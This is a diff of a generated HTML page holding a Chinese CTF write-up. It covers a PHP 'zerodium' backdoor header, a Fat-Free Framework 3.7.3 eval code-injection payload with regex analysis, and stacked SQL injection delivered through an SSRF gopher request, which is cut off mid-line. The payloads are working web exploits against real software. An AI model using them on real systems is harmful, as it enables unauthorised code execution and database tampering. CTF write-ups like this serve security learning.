@@ -3,7 +3,7 @@
     <head prefix="og: http://ogp.me/ns# article: http://ogp.me/ns/article#">
     <meta charset="UTF-8" />
 
-    <meta name="generator" content="Hugo 0.90.1" /><meta name="theme-color" content="#fff" />
+    <meta name="generator" content="Hugo 0.93.1" /><meta name="theme-color" content="#fff" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
     
     <meta name="format-detection" content="telephone=no, date=no, address=no, email=no" />
@@ -18,7 +18,7 @@
 
     
     
-        <script src="/js/meme.min.8cbe976441b5181abfd3093c9beee209b19cdbb1fa77c48d225a83ba81fa3fb1.js"></script>
+        <script src="/js/meme.min.45a777da25d0b1805991f984be4e9ae5e17f3ea94097882dff058256fa34eb17.js"></script>
 
     
 
@@ -283,8 +283,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="nx">User</span><span class="o">-</span><span class="nx">Agentt</span><span class="o">:</span> <span class="nx">zerodiumsystem</span><span class="p">(</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">);</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nx">User</span><span class="o">-</span><span class="nx">Agentt</span><span class="o">:</span> <span class="nx">zerodiumsystem</span><span class="p">(</span><span class="s1">&#39;cat /flag&#39;</span><span class="p">);</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="web-unsetme"><a href="#web-unsetme" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:web-unsetme" class="headings">web-unsetme</a></h2>
 <blockquote>
@@ -309,21 +309,21 @@
 </span><span class="lnt">14
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="c1">// Kickstart the framework
-</span><span class="c1"></span><span class="nv">$f3</span><span class="o">=</span><span class="k">require</span><span class="p">(</span><span class="s1">&#39;lib/base.php&#39;</span><span class="p">);</span>
-
-<span class="nv">$f3</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
-<span class="k">if</span> <span class="p">((</span><span class="nx">float</span><span class="p">)</span><span class="nx">PCRE_VERSION</span><span class="o">&lt;</span><span class="mf">8.0</span><span class="p">)</span>
-    <span class="nx">trigger_error</span><span class="p">(</span><span class="s1">&#39;PCRE version is out of date&#39;</span><span class="p">);</span>
-
-<span class="c1">// Load configuration
-</span><span class="c1"></span><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
-<span class="nv">$a</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
-<span class="nx">unset</span><span class="p">(</span><span class="nv">$f3</span><span class="o">-&gt;</span><span class="nv">$a</span><span class="p">);</span>
-
-<span class="nv">$f3</span><span class="o">-&gt;</span><span class="na">run</span><span class="p">();</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="c1">// Kickstart the framework
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$f3</span><span class="o">=</span><span class="k">require</span><span class="p">(</span><span class="s1">&#39;lib/base.php&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$f3</span><span class="o">-&gt;</span><span class="na">set</span><span class="p">(</span><span class="s1">&#39;DEBUG&#39;</span><span class="p">,</span><span class="mi">1</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">((</span><span class="nx">float</span><span class="p">)</span><span class="nx">PCRE_VERSION</span><span class="o">&lt;</span><span class="mf">8.0</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">    <span class="nx">trigger_error</span><span class="p">(</span><span class="s1">&#39;PCRE version is out of date&#39;</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">// Load configuration
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$a</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;a&#39;</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl"><span class="nx">unset</span><span class="p">(</span><span class="nv">$f3</span><span class="o">-&gt;</span><span class="nv">$a</span><span class="p">);</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">$f3</span><span class="o">-&gt;</span><span class="na">run</span><span class="p">();</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>对比官方index.php的内容可知这道题使用的是3.7版本，盲猜是最新的3.7.3版本，下<a href="https://github.com/bcosca/fatfree/releases/tag/3.7.3" target="_blank" rel="noopener">源码</a>审计。</p>
 <p>网上可以找到一个关于clear函数命令执行的CVE，而在输入后会进入<code>offsetunset</code>函数，此时刚好触发clear函数。所以直接去审clear函数，发现存在eval的代码注入<code>eval('unset('.$val.');');</code>(530行)，估计漏洞点就在这里。</p>
@@ -333,8 +333,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">a</span><span class="o">=</span><span class="nv">$DEBUG</span><span class="p">);</span><span class="cp">?&gt;</span><span class="err">&lt;?=`dir`;//
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">a</span><span class="o">=</span><span class="nv">$DEBUG</span><span class="p">);</span><span class="cp">?&gt;</span><span class="err">&lt;?=`dir`;//
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>然后使用这个payload进入源码debug，发现还是无法成功闭合括号。这就涉及到框架如何处理输入的函数<strong>compile</strong>(240行)，从clear函数调用compile函数代码<code>$this-&gt;compile('@hive.'.$key, FALSE));</code>开始分析compile函数，已知$evaluate变量值为false，就只取用前半段的正则处理部分拿到本地测试：</p>
 <div class="highlight"><div class="chroma">
@@ -368,34 +368,34 @@
 </span><span class="lnt">27
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">&lt;?</span><span class="nx">php</span>
-<span class="nv">$str</span> <span class="o">=</span> <span class="s2">&#34;@hive.</span><span class="se">\$</span><span class="s2">DEBUG[]);?&gt;&lt;?=`dir`;//&#34;</span><span class="p">;</span>
-<span class="nx">preg_replace_callback</span><span class="p">(</span>
-	<span class="s1">&#39;/^@(\w+)((?:\..+|\[(?:(?:[^\[\]]*|(?R))*)\])*)/&#39;</span><span class="p">,</span>
-	<span class="k">function</span><span class="p">(</span><span class="nv">$expr</span><span class="p">)</span> <span class="p">{</span>
-		<span class="c1">// var_dump($expr);
-</span><span class="c1"></span>		<span class="nv">$str</span><span class="o">=</span><span class="s1">&#39;$&#39;</span><span class="o">.</span><span class="nv">$expr</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
-		<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$expr</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
-			<span class="nv">$str</span><span class="o">.=</span><span class="nx">preg_replace_callback</span><span class="p">(</span>
-				<span class="s1">&#39;/\.([^.\[\]]+)|\[((?:[^\[\]\&#39;&#34;]*|(?R))*)\]/&#39;</span><span class="p">,</span>
-				<span class="k">function</span><span class="p">(</span><span class="nv">$sub</span><span class="p">)</span> <span class="p">{</span>
-					<span class="c1">// var_dump($sub);
-</span><span class="c1"></span>					<span class="nv">$val</span><span class="o">=</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$sub</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$sub</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$sub</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
-					<span class="k">if</span> <span class="p">(</span><span class="nx">ctype_digit</span><span class="p">(</span><span class="nv">$val</span><span class="p">))</span>
-						<span class="nv">$val</span><span class="o">=</span><span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$val</span><span class="p">;</span>
-					<span class="nv">$out</span><span class="o">=</span><span class="s1">&#39;[&#39;</span><span class="o">.</span><span class="nx">var_export</span><span class="p">(</span><span class="nv">$val</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;]&#39;</span><span class="p">;</span>
-					<span class="c1">// echo &#34;\n\$out = &#34;.$out.&#34;\n&#34;;
-</span><span class="c1"></span>					<span class="k">return</span> <span class="nv">$out</span><span class="p">;</span>
-				<span class="p">},</span>
-				<span class="nv">$expr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
-			<span class="p">);</span>
-		<span class="c1">// echo &#34;\$str = &#34;.$str.&#34;\n&#34;;
-</span><span class="c1"></span>		<span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>
-	<span class="p">},</span>
-	<span class="nv">$str</span>
-<span class="p">);</span>
-<span class="cp">?&gt;</span><span class="err">
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
+</span></span><span class="line"><span class="cl"><span class="nv">$str</span> <span class="o">=</span> <span class="s2">&#34;@hive.</span><span class="se">\$</span><span class="s2">DEBUG[]);?&gt;&lt;?=`dir`;//&#34;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl"><span class="nx">preg_replace_callback</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">	<span class="s1">&#39;/^@(\w+)((?:\..+|\[(?:(?:[^\[\]]*|(?R))*)\])*)/&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">	<span class="k">function</span><span class="p">(</span><span class="nv">$expr</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// var_dump($expr);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="nv">$str</span><span class="o">=</span><span class="s1">&#39;$&#39;</span><span class="o">.</span><span class="nv">$expr</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">		<span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$expr</span><span class="p">[</span><span class="mi">2</span><span class="p">]))</span>
+</span></span><span class="line"><span class="cl">			<span class="nv">$str</span><span class="o">.=</span><span class="nx">preg_replace_callback</span><span class="p">(</span>
+</span></span><span class="line"><span class="cl">				<span class="s1">&#39;/\.([^.\[\]]+)|\[((?:[^\[\]\&#39;&#34;]*|(?R))*)\]/&#39;</span><span class="p">,</span>
+</span></span><span class="line"><span class="cl">				<span class="k">function</span><span class="p">(</span><span class="nv">$sub</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">					<span class="c1">// var_dump($sub);
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>					<span class="nv">$val</span><span class="o">=</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$sub</span><span class="p">[</span><span class="mi">2</span><span class="p">])</span> <span class="o">?</span> <span class="nv">$sub</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">:</span> <span class="nv">$sub</span><span class="p">[</span><span class="mi">1</span><span class="p">];</span>
+</span></span><span class="line"><span class="cl">					<span class="k">if</span> <span class="p">(</span><span class="nx">ctype_digit</span><span class="p">(</span><span class="nv">$val</span><span class="p">))</span>
+</span></span><span class="line"><span class="cl">						<span class="nv">$val</span><span class="o">=</span><span class="p">(</span><span class="nx">int</span><span class="p">)</span><span class="nv">$val</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">					<span class="nv">$out</span><span class="o">=</span><span class="s1">&#39;[&#39;</span><span class="o">.</span><span class="nx">var_export</span><span class="p">(</span><span class="nv">$val</span><span class="p">)</span><span class="o">.</span><span class="s1">&#39;]&#39;</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">					<span class="c1">// echo &#34;\n\$out = &#34;.$out.&#34;\n&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>					<span class="k">return</span> <span class="nv">$out</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">				<span class="p">},</span>
+</span></span><span class="line"><span class="cl">				<span class="nv">$expr</span><span class="p">[</span><span class="mi">2</span><span class="p">]</span>
+</span></span><span class="line"><span class="cl">			<span class="p">);</span>
+</span></span><span class="line"><span class="cl">		<span class="c1">// echo &#34;\$str = &#34;.$str.&#34;\n&#34;;
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span>		<span class="k">return</span> <span class="nv">$str</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">	<span class="p">},</span>
+</span></span><span class="line"><span class="cl">	<span class="nv">$str</span>
+</span></span><span class="line"><span class="cl"><span class="p">);</span>
+</span></span><span class="line"><span class="cl"><span class="cp">?&gt;</span><span class="err">
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>第一个正则部分很好理解，目的就是分离clear函数调用compile函数时添加的hive数组(个人认为变量后添加 <strong>.</strong> 就是为了方便正则匹配分离hive)，方便后续使用键取值，然后就可以得到</p>
 <div class="highlight"><div class="chroma">
@@ -410,15 +410,15 @@
 </span><span class="lnt">8
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">array</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
-  <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span>
-  <span class="nx">string</span><span class="p">(</span><span class="mi">29</span><span class="p">)</span> <span class="s2">&#34;@hive.</span><span class="si">$DEBUG</span><span class="s2">[]);?&gt;&lt;?=`dir`;//&#34;</span>
-  <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=&gt;</span>
-  <span class="nx">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;hive&#34;</span>
-  <span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=&gt;</span>
-  <span class="nx">string</span><span class="p">(</span><span class="mi">24</span><span class="p">)</span> <span class="s2">&#34;.</span><span class="si">$DEBUG</span><span class="s2">[]);?&gt;&lt;?=`dir`;//&#34;</span>
-<span class="p">}</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">array</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">29</span><span class="p">)</span> <span class="s2">&#34;@hive.</span><span class="si">$DEBUG</span><span class="s2">[]);?&gt;&lt;?=`dir`;//&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span> <span class="s2">&#34;hive&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">24</span><span class="p">)</span> <span class="s2">&#34;.</span><span class="si">$DEBUG</span><span class="s2">[]);?&gt;&lt;?=`dir`;//&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>接下来进行第二段正则，第一部分的正则是为了得到数组名hive，那么第二段就是为了修改字符串以符合<code>[键]</code>的格式，最后连接<code>$hive</code>完成取值，但是不完善的正则加上回调替换就导致了只有部分字符被修改成<code>[键]</code>的格式。以这样的理解去看这段正则就会简单许多，匹配的两部分分别是<strong>匹配.开头的字符直到遇到.[]其中一个字符停止</strong>和<strong>匹配 [键] 格式出现的键</strong></p>
 <div class="highlight"><div class="chroma">
@@ -442,24 +442,24 @@
 </span><span class="lnt">17
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
-  <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span>
-  <span class="nx">string</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="s2">&#34;.</span><span class="si">$DEBUG</span><span class="s2">&#34;</span>
-  <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=&gt;</span>
-  <span class="nx">string</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="s2">&#34;</span><span class="si">$DEBUG</span><span class="s2">&#34;</span>
-<span class="p">}</span>
-<span class="s1">&#39;$DEBUG&#39;</span> <span class="c1"># export函数输出
-</span><span class="c1"></span><span class="k">array</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
-  <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span>
-  <span class="nx">string</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="s2">&#34;[]&#34;</span>
-  <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=&gt;</span>
-  <span class="nx">string</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="s2">&#34;&#34;</span>
-  <span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=&gt;</span>
-  <span class="nx">string</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="s2">&#34;&#34;</span>
-<span class="p">}</span>
-<span class="s1">&#39;&#39;</span> <span class="c1"># export函数输出
-</span><span class="c1"></span><span class="nv">$hive</span><span class="p">[</span><span class="s1">&#39;$DEBUG&#39;</span><span class="p">][]);</span><span class="cp">?&gt;</span><span class="err">&lt;?=`dir`;// # 最后的拼接字符串
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="k">array</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">7</span><span class="p">)</span> <span class="s2">&#34;.</span><span class="si">$DEBUG</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span> <span class="s2">&#34;</span><span class="si">$DEBUG</span><span class="s2">&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;$DEBUG&#39;</span> <span class="c1"># export函数输出
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">array</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span> <span class="p">{</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">0</span><span class="p">]</span> <span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span> <span class="s2">&#34;[]&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl">  <span class="p">[</span><span class="mi">2</span><span class="p">]</span> <span class="o">=&gt;</span>
+</span></span><span class="line"><span class="cl">  <span class="nx">string</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="s2">&#34;&#34;</span>
+</span></span><span class="line"><span class="cl"><span class="p">}</span>
+</span></span><span class="line"><span class="cl"><span class="s1">&#39;&#39;</span> <span class="c1"># export函数输出
+</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$hive</span><span class="p">[</span><span class="s1">&#39;$DEBUG&#39;</span><span class="p">][]);</span><span class="cp">?&gt;</span><span class="err">&lt;?=`dir`;// # 最后的拼接字符串
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>看到最后拼接字符串出现了一个疑问，既然第二部分只是为了修改成数组键格式，那为什么要使用<code>[]</code>？</p>
 <blockquote>
@@ -480,8 +480,8 @@
 <pre tabindex="0" class="chroma"><code><span class="lnt">1
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="o">?</span><span class="nx">a</span><span class="o">=</span><span class="nv">$DEBUG</span><span class="p">[]);</span><span class="cp">?&gt;</span><span class="err">&lt;?=`cat /f*`;//
-</span></code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">?</span><span class="nx">a</span><span class="o">=</span><span class="nv">$DEBUG</span><span class="p">[]);</span><span class="cp">?&gt;</span><span class="err">&lt;?=`cat /f*`;//
+</span></span></span></code></pre></td></tr></table></div>
 </div>
 </div><h2 id="web-慢慢做管理系统"><a href="#web-慢慢做管理系统" class="anchor-link"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 512 512" class="icon anchor-icon"><path d="M326.612 185.391c59.747 59.809 58.927 155.698.36 214.59-.11.12-.24.25-.36.37l-67.2 67.2c-59.27 59.27-155.699 59.262-214.96 0-59.27-59.26-59.27-155.7 0-214.96l37.106-37.106c9.84-9.84 26.786-3.3 27.294 10.606.648 17.722 3.826 35.527 9.69 52.721 1.986 5.822.567 12.262-3.783 16.612l-13.087 13.087c-28.026 28.026-28.905 73.66-1.155 101.96 28.024 28.579 74.086 28.749 102.325.51l67.2-67.19c28.191-28.191 28.073-73.757 0-101.83-3.701-3.694-7.429-6.564-10.341-8.569a16.037 16.037 0 0 1-6.947-12.606c-.396-10.567 3.348-21.456 11.698-29.806l21.054-21.055c5.521-5.521 14.182-6.199 20.584-1.731a152.482 152.482 0 0 1 20.522 17.197zM467.547 44.449c-59.261-59.262-155.69-59.27-214.96 0l-67.2 67.2c-.12.12-.25.25-.36.37-58.566 58.892-59.387 154.781.36 214.59a152.454 152.454 0 0 0 20.521 17.196c6.402 4.468 15.064 3.789 20.584-1.731l21.054-21.055c8.35-8.35 12.094-19.239 11.698-29.806a16.037 16.037 0 0 0-6.947-12.606c-2.912-2.005-6.64-4.875-10.341-8.569-28.073-28.073-28.191-73.639 0-101.83l67.2-67.19c28.239-28.239 74.3-28.069 102.325.51 27.75 28.3 26.872 73.934-1.155 101.96l-13.087 13.087c-4.35 4.35-5.769 10.79-3.783 16.612 5.864 17.194 9.042 34.999 9.69 52.721.509 13.906 17.454 20.446 27.294 10.606l37.106-37.106c59.271-59.259 59.271-155.699.001-214.959z"/></svg></a><a href="#contents:web-慢慢做管理系统" class="headings">web-“慢慢做”管理系统</a></h2>
 <blockquote>
@@ -500,10 +500,10 @@
 </span><span class="lnt">3
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="n">ctf</span> <span class="o">=&gt;</span> <span class="n">users</span> <span class="o">=&gt;</span> <span class="nb">id</span><span class="p">,</span><span class="n">email</span><span class="p">,</span><span class="n">password</span>
-<span class="n">ctf2</span> <span class="o">=&gt;</span> <span class="n">fake_admin</span> <span class="o">=&gt;</span> <span class="nb">id</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">fake_password</span>
-     <span class="o">=&gt;</span> <span class="n">real_admin_here_do_you_find</span> <span class="o">=&gt;</span> <span class="nb">id</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">password</span>
-</code></pre></td></tr></table></div>
+<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">ctf</span> <span class="o">=&gt;</span> <span class="n">users</span> <span class="o">=&gt;</span> <span class="nb">id</span><span class="p">,</span><span class="n">email</span><span class="p">,</span><span class="n">password</span>
+</span></span><span class="line"><span class="cl"><span class="n">ctf2</span> <span class="o">=&gt;</span> <span class="n">fake_admin</span> <span class="o">=&gt;</span> <span class="nb">id</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">fake_password</span>
+</span></span><span class="line"><span class="cl">     <span class="o">=&gt;</span> <span class="n">real_admin_here_do_you_find</span> <span class="o">=&gt;</span> <span class="nb">id</span><span class="p">,</span><span class="n">username</span><span class="p">,</span><span class="n">password</span>
+</span></span></code></pre></td></tr></table></div>
 </div>
 </div><p>通过注入<code>1'||1#</code>可以发现当前表是<code>ctf2.fake_admin</code>，之后使用经典<strong>随便注</strong>的payload换表名。</p>
 <div class="highlight"><div class="chroma">
@@ -512,9 +512,9 @@
 </span><span class="lnt">2
 </span></code></pre></td>
 <td class="lntd">
-<pre tabindex="0" class="chroma"><code class="language-mysql" data-lang="mysql"><span class="c1"># -1&#39;;RENAME TABLE `fake_admin` TO `tyskill`;RENAME TABLE `real_admin_here_do_you_find` TO `fake_admin`;#
-</span><span class="c1"></span><span class="n">gopher</span><span class="p">:</span><span class="o">//</span><span class="mi">127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="p">:</span><span class="mi">80</span><span class="o">/</span><span class="n">_POST</span><span class="o">%</span><span class="mi">20</span><span class="o">/</span><span class="n">admin</span><span class="p">.</span><span class="n">php</span><span class="o">%</span><span class="mi">20</span><span class="n">HTTP</span><span class="o">/</span><span class="mi">1</span><span class="p">.</span><span class="mi">1</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">AHost</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">20127</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">0</span><span class="p">.</span><span class="mi">1</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">AContent</span><span class="o">-</span><span class="n">Type</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">20</span><span class="n">application</span><span class="o">/</span><span class="n">x</span><span class="o">-</span><span class="n">www</span><span class="o">-</span><span class="n">form</span><span class="o">-</span><span class="n">urlencoded</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">AContent</span><span class="o">-</span><span class="n">Length</span><span class="o">%</span><span class="mi">3</span><span class="n">A</span><span class="o">%</span><span class="mi">20166</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">A</span><span class="o">%</span><span class="mi">0</span><span class="n">D</span><span class="o">%</span><span class="mi">0</span><span class="n">Ausername</span><span class="o">%</span><span class="mi">3</span><span class="n">D1</span><span class="o">%</span><span class="mi">2527</span><span class="o">%</span><span class="mi">253</span><span class="n">BRENAME</span><span class="o">%</span><span class="mi">2520</span><span class="n">TABLE</span><span class="o">%</span><span class="mi">2520</span><span class="o">%</span><span class="mi">2560</span><span class="n">fake_admin</span><span class="o">%</span><span class="mi">2560</span><span class="o">%</span><span class="mi">2520</span><span 